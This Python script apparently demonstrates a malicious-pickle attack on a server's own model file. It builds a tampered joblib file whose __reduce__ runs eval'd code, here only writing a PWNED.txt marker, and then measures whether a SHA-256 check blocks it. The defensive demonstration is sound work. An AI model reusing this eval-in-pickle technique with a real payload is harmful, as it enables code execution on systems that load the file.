"""
Unsafe model loading attack against your OWN server, for the before/after demo.

    python -m security.model_tamper build     # writes models/TAMPERED.joblib
    python -m security.model_tamper measure   # loads it with and without the defence

The attacker's file is a booby-trapped copy of the real model: unpickling it
runs hidden code, then hands back the genuine model, so the server starts and
answers normally and nothing looks wrong. The hidden code here is harmless:
it only writes security/results/PWNED.txt. A real attacker could run anything
with the server's permissions (read .env, install a backdoor, change verdicts).

Server demo for the video:
    1. python -m security.model_tamper build
    2. In backend/.env set  MODEL_PATH=models/TAMPERED.joblib  (keep the real MODEL_SHA256)
    3. Undefended: also set DISABLED_DEFENCES=model and run python run.py.
       The server starts, the site works, and PWNED.txt appears: the attack succeeded.
    4. Defended: clear DISABLED_DEFENCES, delete PWNED.txt and run python run.py.
       The server refuses to start ("hash does not match") and PWNED.txt is not created.
    5. Set MODEL_PATH back to models/MODEL_FINAL.joblib.
"""

import argparse
import hashlib
import json
import sys
from pathlib import Path

import joblib

from app.config import Settings
from app.model_service import ModelIntegrityError, load_verified_model

RESULTS = Path(__file__).resolve().parent / 'results'
MARKER = RESULTS / 'PWNED.txt'
TAMPERED = Settings().model_path.parent / 'TAMPERED.joblib'


class _BoobyTrap:
    """Pickles to "run this code, then return the real model"."""

    def __init__(self, real_model_path: Path):
        self.real_model_path = real_model_path

    def __reduce__(self):
        payload = (
            f"(__import__('pathlib').Path({str(MARKER)!r}).write_text("
            f"'Code hidden in the model file ran with the server\\'s permissions.\\n'), "
            f"__import__('joblib').load({str(self.real_model_path)!r}))[1]"
        )
        return eval, (payload,)


def build() -> None:
    real = Settings().model_path
    if not real.is_file():
        sys.exit(f'Train the real model first ({real}).')
    RESULTS.mkdir(exist_ok=True)
    joblib.dump(_BoobyTrap(real), TAMPERED)
    print(f'Wrote {TAMPERED}: a working copy of the model with hidden code that writes {MARKER.name} when loaded.')


def _attempt(path: Path, expected: str, verify: bool) -> dict:
    MARKER.unlink(missing_ok=True)
    try:
        model = load_verified_model(path, expected, verify=verify)
        outcome = 'loaded'
        works = list(model.classes_) == [0, 1] and len(model.predict_proba(['https://example.com'])[0]) == 2
    except ModelIntegrityError as exc:
        outcome, works = f'refused: {exc}', False
    ran = MARKER.exists()
    MARKER.unlink(missing_ok=True)
    return {'outcome': outcome, 'model_works': works, 'hidden_code_ran': ran}


def measure() -> None:
    if not TAMPERED.is_file():
        build()
    real_hash = Settings().model_sha256
    cases = {
        'undefended: plain joblib.load of the tampered file': (TAMPERED, real_hash, False),
        'defended: tampered file, real MODEL_SHA256': (TAMPERED, real_hash, True),
        'defended: tampered file, MODEL_SHA256 left empty': (TAMPERED, '', True),
        'defended: tampered file, hash shortened to 12 characters': (TAMPERED, real_hash[:12], True),
        # Not a bypass of the check: shows the trust boundary. Whoever can edit .env
        # decides which file is trusted, so the hash must come from a trusted source.
        'limit: attacker can also set MODEL_SHA256 to the tampered file\'s hash': (
            TAMPERED, hashlib.sha256(TAMPERED.read_bytes()).hexdigest(), True),
        'defended: genuine model (no attack)': (Settings().model_path, real_hash, True),
    }
    results = {name: _attempt(*args) for name, args in cases.items()}
    for name, result in results.items():
        print(f"{'RAN ' if result['hidden_code_ran'] else 'safe'}  {result['outcome'][:60]:60}  {name}")

    RESULTS.mkdir(exist_ok=True)
    out = RESULTS / 'model-tamper.json'
    out.write_text(json.dumps(results, indent=2))
    print(f'Saved {out}')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('action', choices=['build', 'measure'])
    {'build': build, 'measure': measure}[parser.parse_args().action]()
